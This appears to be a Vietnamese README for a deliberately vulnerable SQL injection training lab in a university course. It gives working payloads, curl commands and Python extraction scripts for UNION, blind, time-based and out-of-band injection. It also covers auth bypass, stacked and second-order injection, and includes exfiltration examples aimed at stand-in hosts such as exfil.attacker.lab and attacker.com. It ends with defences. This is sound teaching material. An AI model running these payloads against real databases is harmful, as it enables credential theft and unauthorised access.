# SQL Injection Lab — DBS401 (FPT University)

> ⚠️ **TUYÊN BỐ GIÁO DỤC / PHẠM VI HỢP PHÁP**
> Ứng dụng này **cố ý** chứa lỗ hổng SQL injection để phục vụ học tập môn DBS401.
> - Chỉ chạy trên **máy của bạn** tại `127.0.0.1`. **Không** deploy ra Internet.
> - Chỉ thực hành trên **chính lab này** hoặc hệ thống bạn **được phép** kiểm thử.
> - Áp dụng kỹ thuật tấn công lên hệ thống không được phép là **vi phạm pháp luật**.

Lab tổ chức theo **phân loại chuẩn** của SQL injection:

```
SQL Injection
├── A. IN-BAND (classic)        — dữ liệu về trên CÙNG kênh HTTP response
│      ├── Error-based          — đọc dữ liệu/ cấu trúc qua thông báo lỗi
│      └── UNION-based          — ghép SELECT của attacker vào kết quả
├── B. INFERENTIAL / BLIND      — KHÔNG lộ dữ liệu, phải SUY LUẬN
│      ├── Boolean-based        — đọc tín hiệu qua 2 trạng thái TRUE/FALSE
│      └── Time-based           — đọc tín hiệu qua ĐỘ TRỄ thời gian
└── C. OUT-OF-BAND (OOB)        — rút dữ liệu qua KÊNH KHÁC (DNS/HTTP tới attacker)
```

Ngoài ra có phần **D. Vector bổ sung** (auth bypass, stacked, second-order) để minh hoạ *impact*.

---

## 1. Cài đặt & chạy

```bash
cd sqli-lab

# Cách nhanh — chạy CẢ app nạn nhân (5000) VÀ collector OOB (5001):
./run.sh

# Hoặc thủ công (2 cửa sổ terminal):
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python3 init_db.py              # tạo lab.db

# Terminal 1 — server của attacker (dùng cho bài OOB):
python3 oob_collector.py        # http://127.0.0.1:5001  (xem /log)
# Terminal 2 — ứng dụng nạn nhân:
python3 app.py                  # http://127.0.0.1:5000
```

Tạo lại DB sạch: `python3 init_db.py`.

### Script khai thác tự động (`exploit.py`)

Ngoài làm thủ công, có sẵn script tự động hoá **chính các bước thủ công** (in rõ payload):

```bash
pip install requests          # đã có trong requirements.txt
python3 exploit.py all        # chạy tất cả kỹ thuật
python3 exploit.py union      # hoặc từng loại: error|union|boolean|time|oob|authbypass|stacked|secondorder
# tuỳ chọn: --base http://127.0.0.1:5000  --collector http://127.0.0.1:5001
```
> Bài `oob` cần `oob_collector.py` đang chạy. Bài `stacked`/`secondorder` làm thay đổi DB —
> chạy `python3 init_db.py` để reset về trạng thái sạch.

### Lược đồ CSDL (SQLite)

| Bảng            | Cột                                              | Vai trò |
|-----------------|--------------------------------------------------|---------|
| `users`         | id, username, password, role, email, credit_card | auth bypass, UNION dump, blind |
| `products`      | id, name, category, price, description           | error/UNION/time/OOB |
| `feedback`      | id, username, message                            | stacked queries |
| `admin_secrets` | id, name, flag                                   | mục tiêu (CTF flag) |

**Mục tiêu:** trích xuất mật khẩu `admin` (`S3cr3t_Admin_2024!`) và `flag` trong
`admin_secrets` (`DBS401{...}`) bằng **mỗi** kỹ thuật.

> **Mẹo công cụ:** dùng trình duyệt, `curl`, hoặc Burp Repeater. Nhớ **URL-encode** khi
> gửi qua URL (dấu cách→`%20`, `'`→`%27`). Với `curl` POST dùng `--data-urlencode`.
> Ký tự comment: `-- ` (có **dấu cách** sau) hoặc `/* */`.

---

## 2. Nền tảng chung

SQLi xảy ra khi input bị **nối thẳng vào chuỗi truy vấn** thay vì tham số hoá:

```python
query = f"SELECT ... WHERE id = {pid}"   # [VULN] — pid đi thẳng vào SQL
```

Quy trình khai thác thủ công: **(1) phát hiện** điểm chèn (`'`, toán tử) → **(2) xác định
ngữ cảnh** (số / chuỗi `'...'` / LIKE) → **(3) khôi phục cú pháp hợp lệ** (đóng chuỗi,
cân bằng ngoặc, comment phần thừa) → **(4) chọn kỹ thuật theo lượng thông tin phản hồi**:

| Phản hồi trả về gì? | Nhóm | Kỹ thuật |
|---|---|---|
| Hiện lỗi SQL | In-band | **Error-based** |
| Hiện dữ liệu truy vấn ra trang | In-band | **UNION-based** |
| Chỉ có 2 trạng thái khác nhau | Blind | **Boolean-based** |
| Không khác biệt gì cả | Blind | **Time-based** |
| Hoàn toàn câm, nhưng DB gọi ra ngoài được | OOB | **Out-of-band** |

---

# A. IN-BAND SQLi

Dữ liệu trả về **trên chính kênh HTTP response** — nhanh và trực tiếp nhất.

## A1 — Error-based  (`/products?id=`)

Dựa vào **thông báo lỗi** của CSDL để phát hiện lỗ hổng và (trên nhiều DBMS) để *đẩy dữ
liệu ra qua lỗi*.

**Bước 1 — chèn `'` phá cú pháp:**
```
http://127.0.0.1:5000/products?id=1'
```
→ `OperationalError: unrecognized token: "'"` → xác nhận input vào thẳng SQL (ngữ cảnh **số**).

**Bước 2 — xác nhận bằng logic:**
```
?id=1 AND 1=1      → có sản phẩm 1
?id=1 AND 1=2      → rỗng (truy vấn hợp lệ, điều kiện sai)
```

> **Trích dữ liệu qua lỗi trên DBMS thật** (SQLite không có hàm này nên lab dùng UNION/blind
> để lấy dữ liệu; đây là tham chiếu để bạn nhận dạng ngoài thực tế):
> ```sql
> -- MySQL:
> ?id=1 AND extractvalue(1, concat(0x7e,(SELECT password FROM users LIMIT 1)))
> ?id=1 AND updatexml(1, concat(0x7e,(SELECT version())), 1)
> -- MSSQL (ép lỗi convert):
> ?id=1 AND 1=convert(int,(SELECT TOP 1 password FROM users))
> ```
> Dữ liệu nằm ngay trong chuỗi lỗi `XPATH syntax error: '~S3cr3t...'`.

## A2 — UNION-based  (`/products?id=`)

Ghép một `SELECT` của attacker vào kết quả → đọc **dữ liệu bất kỳ** ra trang.

**Bước 1 — đếm số cột** (`ORDER BY` tăng đến khi lỗi):
```
?id=1 ORDER BY 1   → OK
?id=1 ORDER BY 3   → OK
?id=1 ORDER BY 4   → lỗi   ⇒ có 3 cột
```

**Bước 2 — tìm cột hiển thị** (dùng id không tồn tại để bỏ dòng thật):
```
?id=0 UNION SELECT 1,2,3     → thấy name=2, description=3 ⇒ cột 2,3 in ra được
```

**Bước 3 — liệt kê cấu trúc (SQLite):**
```
?id=0 UNION SELECT 1, sqlite_version(), 3
?id=0 UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table'   -- mọi bảng + cột
```
*(MySQL/MSSQL/Postgres dùng `information_schema.tables` / `information_schema.columns`.)*

**Bước 4 — rút dữ liệu:**
```
?id=0 UNION SELECT id, username, password FROM users
?id=0 UNION SELECT 1, username||':'||password, 3 FROM users     -- gộp cột
?id=0 UNION SELECT 1, name, flag FROM admin_secrets             -- lấy flag
```
```bash
curl "http://127.0.0.1:5000/products?id=0%20UNION%20SELECT%20id,username,password%20FROM%20users"
```
→ Kết quả: `admin / S3cr3t_Admin_2024!` và flag `DBS401{m4nu4l_sql1_m4st3r}`.

**Biến thể qua LIKE** (`?search=`, ngữ cảnh `name LIKE '%...%'`):
```
?search=zzz%' UNION SELECT 1,username,password FROM users -- 
```

---

# B. INFERENTIAL / BLIND SQLi

Ứng dụng **không trả dữ liệu, không trả lỗi**. Ta hỏi CSDL các câu **đúng/sai** và đọc câu
trả lời qua *hành vi* (nội dung trang khác nhau, hoặc độ trễ). Mỗi câu hỏi = 1 bit.

## B1 — Boolean-based  (`/check?username=`)

Chỉ trả về **`EXISTS`** / **`NOT FOUND`** — đó là 2 trạng thái làm "bit trả lời".

**Bước 1 — xác nhận chèn (ngữ cảnh chuỗi `'...'`):**
```
?username=admin' AND '1'='1      → EXISTS     (đúng)
?username=admin' AND '1'='2      → NOT FOUND  (sai)
```

**Bước 2 — hỏi đúng/sai để dò.** Tìm độ dài mật khẩu admin:
```
?username=admin' AND length(password) = 18 --   → EXISTS  (dài 18)
```

**Bước 3 — dò từng ký tự** (`substr` + so sánh, hoặc `unicode` để chia đôi nhị phân):
```
?username=admin' AND substr(password,1,1) = 'S' --              → EXISTS ⇒ ký tự 1 = 'S'
?username=admin' AND unicode(substr(password,1,1)) > 77 --      → thu hẹp khoảng ASCII
```

**Script dò tự động (binary search):**
```python
import requests
URL = "http://127.0.0.1:5000/check"
def truthy(cond):
    r = requests.get(URL, params={"username": f"admin' AND {cond} -- "})
    return ">EXISTS<" in r.text or "<b>EXISTS</b>" in r.text
def extract(col, table, where):
    out = ""
    for i in range(1, 60):
        if not truthy(f"length((SELECT {col} FROM {table} WHERE {where})) >= {i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truthy(f"unicode(substr((SELECT {col} FROM {table} WHERE {where}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo); print(out)
    return out
print(extract("password", "users", "username='admin'"))
print(extract("flag", "admin_secrets", "name='master_flag'"))
```

## B2 — Time-based  (`/track?code=`)

Phản hồi **luôn giống nhau** → không còn boolean. Ta ép CSDL **ngủ** khi điều kiện đúng,
rồi đo thời gian để suy ra bit.

**Bước 1 — xác nhận gây trễ** (dùng `UNION SELECT sleep()` để trễ **đúng 1 lần**):
```
?code=x' UNION SELECT sleep(3) --     → chậm ~3s ⇒ có SQLi
```
> Dùng `OR sleep(3)` sẽ bị đánh giá *trên mỗi dòng* bảng `products` (5 dòng) → trễ ~15s.
> Trên MySQL tương đương `?code=x' OR IF(1=1, SLEEP(3), 0)-- `.

**Bước 2 — biến đúng/sai thành trễ bằng `CASE WHEN`:**
```
?code=x' UNION SELECT (CASE WHEN substr((SELECT password FROM users WHERE username='admin'),1,1)='S' THEN sleep(3) ELSE 0 END)-- 
```
→ ký tự 1 là `'S'` thì trễ ~3s, ngược lại trả ngay.
```bash
curl -s -o /dev/null -w "%{time_total}s\n" \
 "http://127.0.0.1:5000/track?code=x%27%20UNION%20SELECT%20sleep(3)--%20"
```

**Script dò bằng thời gian:** giống B1 nhưng hàm đo là:
```python
import requests, time
def slow(cond):
    p = f"x' UNION SELECT (CASE WHEN ({cond}) THEN sleep(3) ELSE 0 END) -- "
    t = time.time(); requests.get("http://127.0.0.1:5000/track", params={"code": p})
    return (time.time() - t) > 1.5
# ...phần extract() dùng slow() thay cho truthy()
```

---

# C. OUT-OF-BAND (OOB) SQLi

Dùng khi injection **câm hoàn toàn**: không dữ liệu, không lỗi, **và không cả độ trễ ổn
định** (ví dụ truy vấn chạy bất đồng bộ). Thay vì đọc phản hồi, ta ép **chính CSDL gửi dữ
liệu ra một kênh khác** (DNS/HTTP) tới **server mà attacker kiểm soát**. Ưu điểm: rút được
dữ liệu trong **một phát**, không cần dò từng bit.

### Mô hình trong lab

```
Browser/curl ──(1) inject──▶  App nạn nhân (5000)  ──(2) CSDL tự gọi ra──▶  Collector attacker (5001)
       ▲                                                                              │
       └────────── response vô hại, KHÔNG có dữ liệu ───────────────                 (3) dữ liệu hiện ở /log
```

- `oob_collector.py` = **server của attacker** (mô phỏng Burp Collaborator / interactsh).
- Hàm `dns_lookup()` đăng ký trong `app.py` = mô phỏng primitive mạng của DBMS. Khi bị gọi,
  nó "phân giải tên miền" `<dữ-liệu>.exfil.attacker.lab` → thực chất gửi về collector.

### Khai thác  (`/lookup?host=`)

Endpoint này blind tuyệt đối (thử `?host=abc` — response luôn như nhau). Chèn OOB:

**Bước 1 — chạy collector** (`python3 oob_collector.py`) rồi mở `http://127.0.0.1:5001/log`.

**Bước 2 — trigger exfil** (hex-encode dữ liệu cho an toàn trên DNS — đúng như thực tế):
```
/lookup?host=x' UNION SELECT dns_lookup(hex((SELECT password FROM users WHERE username='admin'))||'.exfil.attacker.lab')-- 
```
```bash
curl -s "http://127.0.0.1:5000/lookup?host=x%27%20UNION%20SELECT%20dns_lookup(hex((SELECT%20password%20FROM%20users%20WHERE%20username=%27admin%27))%7C%7C%27.exfil.attacker.lab%27)--%20"
```

**Bước 3 — đọc dữ liệu ở collector:** mở `http://127.0.0.1:5001/log`. Bạn sẽ thấy host nhận
được, label hex và **bản giải mã** (collector tự `unhex`), ví dụ `S3cr3t_Admin_2024!`.
Chú ý: **dữ liệu KHÔNG hề xuất hiện** trong response của app 5000 — đó là bản chất OOB.

Lấy flag tương tự:
```
/lookup?host=x' UNION SELECT dns_lookup(hex((SELECT flag FROM admin_secrets))||'.exfil.attacker.lab')-- 
```

> **Primitive OOB trên DBMS thật** (ánh xạ sang `dns_lookup` của lab):
> | DBMS | DNS exfil | HTTP/UNC |
> |------|-----------|----------|
> | **MySQL** (Win) | `LOAD_FILE(CONCAT('\\\\',(subquery),'.attacker.com\\x'))` | — |
> | **MSSQL** | `exec master..xp_dirtree '\\'+(subquery)+'.attacker.com\x'` | `xp_fileexist` |
> | **Oracle** | `UTL_INADDR.get_host_address((subquery)||'.attacker.com')` | `UTL_HTTP.request`, `HTTPURITYPE` |
> | **PostgreSQL** | `COPY (…) TO PROGRAM 'nslookup …'` | `dblink` |
>
> Ngoài đời, "collector" là một domain bạn sở hữu + server DNS/HTTP ghi log (Burp
> Collaborator, interactsh, hoặc `dnslog.cn`). Dữ liệu được nhét vào **subdomain** vì mọi
> truy vấn DNS cho `*.attacker.com` đều về name server của bạn.

---

# D. Vector bổ sung (minh hoạ impact)

## D1 — Authentication bypass  (`/login`)
Nhập username = `admin' -- ` (có dấu cách cuối), password bất kỳ → comment bỏ phần kiểm tra
mật khẩu → đăng nhập thành admin. Hoặc username = `' OR '1'='1' -- `.
```bash
curl -s -i -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" | grep Location
```

## D2 — Stacked queries  (`/feedback`)
Endpoint dùng `executescript()` nên chạy nhiều câu lệnh. Nâng `alice` lên admin — nhập ô tên:
```
a', 'x'); UPDATE users SET role='admin' WHERE username='alice'; -- 
```
Phải cấp đủ 2 giá trị cho `INSERT (username,message)` (`'a','x'`), nếu không câu đầu lỗi và
cả script dừng. *(Nhiều driver chỉ chạy 1 câu → stacked không phải lúc nào cũng dùng được;
phổ biến trên MSSQL/PostgreSQL.)*

## D3 — Second-order  (`/register` → `/profile`)
Bước ghi (`/register`) **đã tham số hoá an toàn**, payload được lưu nguyên văn; nhưng bước đọc
(`/profile`) lại nối chuỗi → payload kích hoạt muộn. Đăng ký username:
```
x' UNION SELECT id, flag, 3 FROM admin_secrets -- 
```
rồi mở `/profile` (hoặc test nhanh `/profile?u=...`). Bài học: **mọi** điểm dựng truy vấn phải
tham số hoá, kể cả với dữ liệu lấy từ chính CSDL của mình.

---

## 3. Bảng tổng kết

| Nhóm | Dạng | Endpoint | Payload tiêu biểu |
|------|------|----------|-------------------|
| In-band | Error-based | `/products?id=` | `1'` |
| In-band | UNION-based | `/products?id=` | `0 UNION SELECT 1,username,password FROM users` |
| Blind | Boolean-based | `/check?username=` | `admin' AND substr(password,1,1)='S' -- ` |
| Blind | Time-based | `/track?code=` | `x' UNION SELECT sleep(3) -- ` |
| OOB | Out-of-band | `/lookup?host=` | `x' UNION SELECT dns_lookup(hex((SELECT password FROM users WHERE username='admin'))||'.exfil.attacker.lab') -- ` |
| Bonus | Auth bypass | `/login` | `admin' -- ` |
| Bonus | Stacked | `/feedback` | `a', 'x'); UPDATE users SET role='admin' WHERE username='alice'; -- ` |
| Bonus | Second-order | `/register`→`/profile` | `x' UNION SELECT id,flag,3 FROM admin_secrets -- ` |

---

## 4. Phòng chống

1. **Parameterized queries / prepared statements** (biện pháp số một):
   ```python
   cur.execute("SELECT id,name,description FROM products WHERE id = ?", (pid,))
   ```
2. **ORM / query builder** dùng đúng cách; không tự nối chuỗi.
3. **Validate & ép kiểu** đầu vào (id phải là số nguyên…).
4. **Least privilege** cho tài khoản DB của app → giảm thiệt hại.
5. **Tắt chi tiết lỗi** ở production → chặn error-based.
6. **Chặn OOB ở tầng hạ tầng:** không cho DB server ra Internet (egress firewall/DNS),
   vô hiệu hoá các hàm mạng (`UTL_HTTP`, `xp_dirtree`, `LOAD_FILE`…).
7. **Tham số hoá cả dữ liệu nội bộ** → chặn second-order.
8. **WAF + logging/alert** là lớp phát hiện bổ sung (không thay cho việc sửa code).

---

## 5. Dọn dẹp

```bash
# Ctrl+C để dừng. Xoá DB và venv:
rm -f lab.db && rm -rf .venv
```

*Tài liệu phục vụ môn DBS401 — FPT University. Chỉ dùng trong môi trường lab được phép.*
